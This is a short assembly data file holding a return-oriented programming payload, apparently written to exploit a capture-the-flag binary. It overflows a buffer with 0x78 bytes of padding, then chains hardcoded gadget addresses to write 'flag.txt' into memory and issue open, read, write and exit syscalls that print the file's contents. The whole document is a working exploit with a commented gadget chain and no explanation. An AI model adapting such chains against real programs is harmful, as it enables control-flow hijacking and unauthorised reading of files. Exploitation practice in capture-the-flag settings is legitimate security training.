times 0x78 db 0x23

dq 0x45b056 ; pop %rdx; ret
dq 0x7478742e67616c66 ; flag.txt
dq 0x45899c ; pop %rax; ret
dq 0x6d6018 + 7 - 0x18 ; write address (expect the top byte in the table being 0x00)
dq 0x403472 ; mov %rdx,0x18(%rax); add $0x8,%rsp; ret
dq 0 ; placeholder
dq 0x45b667 ; pop %rdi; ret
dq 0x6d6018 + 7 ; "flag.txt"
dq 0x45ed9a ; pop %rsi; ret
dq 0 ; O_RDONLY
dq 0x45899c ; pop %rax; ret
dq 2 ; sys_open
dq 0x484105 ; syscall; ret

dq 0x45b056 ; pop %rdx; ret
dq 0x401ca7 ; address of add $0x8,%rsp; ret
dq 0x40968c ; mov %rax,%rdi; callq *%rdx
dq 0x45ed9a ; pop %rsi; ret
dq 0x6d6018 ; data buffer address
dq 0x45b056 ; pop %rdx; ret
dq 0x6d60d0 - 0x6d6018 ; data buffer size
dq 0x45899c ; pop %rax; ret
dq 0 ; sys_read
dq 0x484105 ; syscall; ret

dq 0x45b667 ; pop %rdi; ret
dq 1 ; stdout
dq 0x45899c ; pop %rax; ret
dq 1 ; sys_write
dq 0x484105 ; syscall; ret

dq 0x45b667 ; pop %rdi; ret
dq 0 ; normally exit
dq 0x45899c ; pop %rax; ret
dq 60 ; sys_exit
dq 0x484105 ; syscall; ret

db 0x0a ; for fgets()
